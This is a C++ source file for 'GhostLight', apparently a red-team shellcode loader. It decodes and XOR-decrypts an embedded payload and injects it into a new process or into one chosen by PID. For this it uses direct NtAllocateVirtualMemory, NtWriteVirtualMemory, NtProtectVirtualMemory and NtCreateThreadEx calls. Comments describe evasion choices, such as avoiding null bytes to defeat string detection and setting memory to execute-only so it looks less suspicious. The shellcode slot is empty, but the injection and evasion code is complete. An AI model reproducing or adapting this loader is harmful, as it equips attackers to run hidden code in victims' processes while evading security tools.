// GhostLight.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "base64.h"
#include "decryption.h"
#include <string>
#include "ghostcalls.h"


using std::cout;
using std::wcout;
using std::endl;
using std::string;

// DATA TYPES
enum ExecutionMode {
	EXEC = 1,
	PID = 2
};
enum DECRYPTION_MODE {
	XOR_KEY = 1,
	BYTEWISE_XOR = 2
};

// GLOBALS
bool DEBUG_MODE = false;
ExecutionMode E_MODE;
int TARGET_PID;
char* LAUNCH_COMMAND;

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CONFIG
///////////////////////////////////////////////////////////////////////////////////////

// TODO: PUT YOUR SC HERE
const string ENCODED_SC = "";

// TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
const unsigned char BYTEWISE_XOR_KEY = 77;

// TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
// NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
unsigned char XOR_KEY_STR[] = { 'e', 'x', 'i', 'g', 'e', 'n', 't'};
const size_t XOR_KEY_STR_LEN = 7;

// TODO: SET DECRYPTION MODE TO EITHER ENCRYPTION_KEY OR BYTEWISE_XOR
DECRYPTION_MODE DECR_MODE = XOR_KEY;


// THE RUNNER METHOD, THIS IS PROVIDED
void run(unsigned char*, size_t); 
void DisplayError(DWORD NTStatusMessage);

int main(int argc, char** argv)
{
	// HANDLE ARGUMENT FOR PROCESS TO SPAWN
	if (argc < 3) {
		cout << "Invalid usage!" << endl;
		exit(1);
	}

	// DEAL WITH DEBUG MODE
	if (argc >= 4) {
		char d[] = "debug";
		if (strcmp(argv[3], d) == 0) {
			cout << "Debug mode!" << endl;
			DEBUG_MODE = true;
		}
	}

	if (DEBUG_MODE) {
		for (size_t i = 0; i < argc; i++) {
			cout << i << ": " << argv[i] << endl;
		}
	}

	// IMPORTANT! BASE64 ENCODED SC GOES HERE
	char* argString = argv[2];
	if (strcmp(argv[1], "PID") == 0) {
		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
		E_MODE = PID;
		TARGET_PID = atoi(argString);

	}
	else if (strcmp(argv[1], "EXEC") == 0) {
		// EXECUTE BY INJECTING INTO AN EXISTING PROCESS WITH PID
		E_MODE = EXEC;
		LAUNCH_COMMAND = argString;

	}
	else {
		if (DEBUG_MODE) cout << "Error with execution mode: must be EXEC or PID" << endl;
		exit(2);
	}


	// BASE64 DECODE THE STRING TO GET BYTES
	string decodedBytes = base64_decode(ENCODED_SC);
	unsigned char* encryptedBytes = (unsigned char*)decodedBytes.c_str();
	size_t bufLen = decodedBytes.length();

	// DECRYPT THE BYTES DEPENDING ON DECRYPTION MODE
	unsigned char* decr = nullptr;
	if (DECR_MODE == XOR_KEY) {
		decr = decryption::decryptKey(XOR_KEY_STR, XOR_KEY_STR_LEN, encryptedBytes, bufLen);
	}
	else if (DECR_MODE == BYTEWISE_XOR) {
		decr = decryption::decryptXOR(BYTEWISE_XOR_KEY, encryptedBytes, bufLen);
	}
	

	// RUN THE SC
	run(decr, bufLen);

	return 0;

}

void run(unsigned char* sc, size_t scLen) {

	// NOW THE FUN BEGINS
	HANDLE processHandle = NULL;
	HANDLE remoteThread;
	PVOID remoteBuffer = NULL;
	BOOL success;
	SIZE_T bytesWritten = 0;
	ULONG oldProtectOption = 0;



	// SWITCH DEPENDING ON THE EXECUTION MODE
	// TODO: COULD USE CUSTOM SYSCALLS FOR THESE TOO, BUT IT'S COMPLEX TO CREATE A NEW PROCESS BECAUSE I NEED TO CREATE A NEW SECTION TO EXECUTE AND ALL THAT
	if (E_MODE == EXEC) {


		// EXECUTE AN APPLICATION LIKE IEXPLORE TO TARGET
		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
		success = CreateProcessA(
			NULL,
			LAUNCH_COMMAND,
			NULL,
			NULL,
			NULL,
			NORMAL_PRIORITY_CLASS,
			NULL,
			NULL,
			pStartupInfo,
			pProcessInfo
		);
		if (!success) {
			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " failed: " << success << endl;
			exit(3);
		}
		else {
			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " succeeded!" << endl;
		}

		// GET THE PROCESS HANDLE
		processHandle = pProcessInfo->hProcess;
	}
	else if (E_MODE == PID) {

		// OPEN PROCESS WITH THE TARGET PID
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)TARGET_PID);
	}
	if (!processHandle) {
		if (DEBUG_MODE) cout << "Failed to get process Handle." << endl;

		exit(4);
	}
	else {
		if (DEBUG_MODE)  cout << "Got process handle!" << endl;
	}


	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
	NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &scLen, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (!remoteBuffer) {
		if (DEBUG_MODE) cout << "Unable to allocate virtual memory. RemoteBuffer: " << remoteBuffer << endl;
		exit(5);
	}
	else {
		if (DEBUG_MODE) cout << "Successfully allocated virtual memory at " << remoteBuffer << endl;
	}

	// WRITE SHELLCODE INTO THE SPACE
	NtWriteVirtualMemory(processHandle, remoteBuffer, sc, scLen, &bytesWritten);
	if (bytesWritten < scLen) {
		if (DEBUG_MODE) cout << "Failed to write entire sc: wrote " << bytesWritten << " out of " << scLen << " bytes." << endl;
		exit(6);
	}
	else {
		if (DEBUG_MODE) cout << "Wrote full sc to process memory" << endl;
	}

	// REPROTECT THE MEMORY TO EXECUTE ONLY SO IT'S NOT SUS
	NtProtectVirtualMemory(processHandle, &remoteBuffer, &scLen, PAGE_EXECUTE, &oldProtectOption);
	if (!oldProtectOption) {
		if (DEBUG_MODE) cout << "Unable to update protection (" << oldProtectOption << ")" << endl;
		exit(7);
	}
	else {
		if (DEBUG_MODE) cout << "Successfully changed sc memory protection to execute only" << endl;
	}

	// CREATE THREAD
	NtCreateThreadEx(&remoteThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuffer, NULL, FALSE, 0, 0, 0, nullptr);

	NtClose(processHandle);

	exit(0);
}